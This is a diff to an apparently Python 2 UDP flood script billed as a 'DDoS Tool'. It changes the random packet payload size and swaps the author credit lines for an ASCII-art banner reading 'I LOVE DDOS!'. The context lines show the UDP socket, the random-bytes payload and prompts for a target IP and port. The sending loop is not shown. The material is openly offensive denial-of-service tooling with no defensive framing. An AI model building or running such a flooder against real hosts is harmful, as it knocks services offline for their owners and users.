@@ -14,15 +14,31 @@ year = now.year
 
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(10892)
+bytes = random._urandom(9892)
 #############
 
 os.system("clear")
-os.system("figlet DDos Attack")
-print
-print "Author   : zhicco234" 
-print "github   : https://github.com/zhicco234"
-print
+os.system("figlet DDos Attack2")
+print \
+"""
+    ,----------------,              ,---------,
+        ,-----------------------,          ,"        ,"|
+      ,"                      ,"|        ,"        ,"  |
+     +-----------------------+  |      ,"        ,"    |
+     |  .-----------------.  |  |     +---------+      |
+     |  |                 |  |  |     | -==----'|      |
+     |  |  I LOVE DDOS!   |  |  |     |         |      |
+     |  |  ~> DDoS Tool<~ |  |  |/----|`---=    |      |
+     |  |Created By ZHICCO|  |  |   ,/|==== ooo |      ;
+     |  |                 |  |  |  // |(((( [33]|    ,"
+     |  `-----------------'  |," .;'| |((((     |  ,"
+     +-----------------------+  ;;  | |         |,"
+        /_)______________(_/  //'   | +---------+
+   ___________________________/___  `,
+  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
+ / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
+/_==__==========__==_ooo__ooo=_/'   /___________
+""" 
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
